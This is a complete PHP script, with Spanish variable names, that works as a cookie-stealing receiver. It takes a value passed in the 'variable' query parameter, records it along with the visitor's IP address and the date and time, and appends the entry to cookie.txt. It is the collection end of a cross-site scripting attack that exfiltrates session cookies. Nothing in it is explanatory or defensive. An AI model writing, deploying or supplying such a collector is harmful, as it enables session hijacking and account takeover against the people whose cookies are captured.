<?php
$archivo = fopen('cookie.txt','a');

$cookie = $_GET['variable'];
$ip = getenv ('REMOTE_ADDR');
$re = "";
$fecha=date("j F, Y, g:i a");

fwrite($archivo, "Cookie: $cookie "." $re "."<br> IP: " .$ip. "<br> Fecha y Hora: " .$fecha. "</hr>");

fclose($archivo);
?>